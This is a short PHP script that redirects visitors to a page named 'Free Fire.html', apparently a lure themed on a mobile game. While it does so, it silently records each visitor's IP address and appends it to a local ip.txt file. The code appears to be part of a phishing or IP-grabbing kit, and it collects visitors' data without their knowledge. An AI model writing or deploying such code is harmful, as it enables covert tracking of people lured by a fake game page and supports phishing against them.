<?php
echo "<script> location.href='./Free Fire.html'</script>";

require_once ('getip.php');
$getIp = new \Request;
$IP = $getIp->getIpAddress();

$file = fopen('./ip.txt','a');
fwrite($file, "IP: ");
fwrite($file,$IP);
fwrite($file,"\r\n");
fclose($file);

?>